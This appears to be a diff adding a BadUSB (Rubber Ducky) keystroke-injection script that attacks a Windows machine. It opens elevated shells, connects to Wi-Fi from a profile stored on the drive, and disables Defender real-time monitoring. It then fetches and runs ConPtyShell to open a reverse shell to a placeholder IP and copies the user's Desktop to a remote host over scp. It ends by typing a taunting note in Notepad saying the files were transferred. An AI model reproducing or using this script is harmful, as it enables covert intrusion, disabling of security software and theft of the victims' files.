@@ -1,0 +1,114 @@
+DELAY 700 
+Gui + r 
+DELAY 700 
+STRING cmd.exe 
+Delay 700 
+Alt + Shift + Ctrl + ENTER 
+DELAY 1000
+LEFTARROW + ENTER 
+DELAY 1000 
+STRING netsh interface set interface name="Wi-FI" enable
+DELAY 100
+ENTER
+DELAY 700
+STRING  Copy F:\Wi-Fi-GalaxyF22E775.xml  
+DELAY 400
+ENTER 
+DELAY 700 
+STRING netsh wlan add profile filename=""
+DELAY 100
+ENTER 
+DELAY 700 
+STRING netsh wlan connect name="" 
+DELAY 100
+ENTER 
+DELAY 6000
+Gui + r
+DELAY 700  
+STRING powershell.exe 
+Delay 700 
+Alt + Shift + Ctrl + ENTER 
+DELAY 1000
+LEFTARROW + ENTER 
+DELAY 1000 
+STRING  Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 100
+ENTER
+DELAY 1000
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell "ip"  3001
+Delay 100
+ENTER 
+DELAY 6000 
+Gui + r
+DELAY 700  
+STRING cmd.exe 
+Delay 700 
+ENTER 
+DELAY 2000
+STRING color 2 
+DELAY 100 
+ENTER 
+DELAY 700 
+STRING cd Desktop 
+DELAY 100
+ENTER 
+DELAY 700 
+STRING scp -r C:\Users\Dell\Desktop user@ip:/home/user/
+DELAY 100
+ENTER 
+DELAY 1000
+STRING yes 
+DELAY 100 
+ENTER 
+DELAY 1000
+STRING 
+DELAY  100
+ENTER
+DELAY 3000
+DELAY 700 
+Gui + r 
+DELAY 700 
+STRING notepad.exe 
+DELAY 100 
+ENTER 
+DELAY 700 
+STRING ________________________
+DELAY 100 
+ENTER 
+DELAY 100 
+STRING |                  |
+DELAY 100 
+ENTER
+DELAY 100 
+STRING |   What           |
+DELAY 100 
+ENTER
+DELAY 100 
+STRING |   should         |
+DELAY 100 
+ENTER
+DELAY 100 
+STRING | we do now User?  |
+DELAY 100 
+ENTER
+DELAY 100 
+STRING _________________________
+DELAY 100 
+ENTER
+DELAY 100 
+STRING         ||
+DELAY 100 
+ENTER
+STRING  (\__/) || 
+DELAY 100
+ENTER 
+STRING  ( .,.) ||
+DELAY 100
+ENTER 
+STRING  /    づ 
+DELAY 700
+ENTER 
+STRING  Your files have tranfered to me , thank you so much for this opportunity !                
+
+
+  
